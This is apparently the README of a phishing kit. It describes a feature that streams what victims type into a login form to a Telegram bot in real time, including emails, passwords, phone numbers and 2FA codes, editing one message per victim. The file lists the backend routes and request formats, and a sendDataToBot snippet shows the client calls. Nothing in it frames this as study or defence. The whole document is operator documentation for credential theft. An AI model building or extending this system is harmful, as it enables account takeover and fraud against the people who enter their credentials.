# Telegram Live Updates

## Overview
Instead of sending a **new message** for every keystroke, the system now sends **ONE message** that updates live as the user types.

## How It Works

### 1. First Data Capture
When the user types the first character, a new message is sent to Telegram:

```
🔔 Live Data Capture

📧 Email/Phone: user@example.com
🔐 Password: ***
📱 Phone: 1234567890
✅ 2FA Verify: 123456

👤 User: username (ID: 12345)
🕐 Last Update: Dec 15, 2025, 10:30:45 AM
```

### 2. Subsequent Updates
Every time the user types, **the same message is edited** with the updated data using Telegram's `editMessageText` API.

### 3. HTML Formatting
The message uses HTML formatting (`<b>`, `<code>`) for better readability:
- `<b>Bold</b>` for labels
- `<code>Monospace</code>` for values

## Implementation Details

### Backend Files
- **`telegram-session-store.ts`** - Stores message IDs per user/chat
- **`telegram-proxy/route.ts`** - Sends or edits messages
- **`telegram-clear-session/route.ts`** - Clears session when done

### Frontend
- **`dataSync.ts`** - Updated to support live updates
- **`success/page.tsx`** - Clears session on completion

### Key Features
✅ **Single Message** - One message per user session  
✅ **Live Updates** - Edits message instead of sending new ones  
✅ **HTML Formatting** - Clean, readable format  
✅ **Multi-Chat Support** - Works with multiple chat IDs  
✅ **Session Management** - Clears when user completes flow  

## API Endpoints

### POST `/api/telegram-proxy`
Sends or updates live data to Telegram.

**Request:**
```json
{
  "dataType": "user_email",
  "value": "user@example.com",
  "userId": "12345",
  "username": "johndoe"
}
```

### POST `/api/telegram-clear-session`
Clears the live session for a user.

**Request:**
```json
{
  "userId": "12345"
}
```

## Usage Example

```typescript
import { sendDataToBot, clearTelegramSession } from '../lib/dataSync';

// Send data (creates or updates live message)
sendDataToBot('user_email', 'user@example.com');

// Clear session when done
clearTelegramSession();
```

## Benefits
- 🚀 **Less spam** - No flood of messages
- 📊 **Better tracking** - All data in one place
- ⚡ **Real-time** - See changes as they happen
- 🎯 **Organized** - Clean, formatted messages

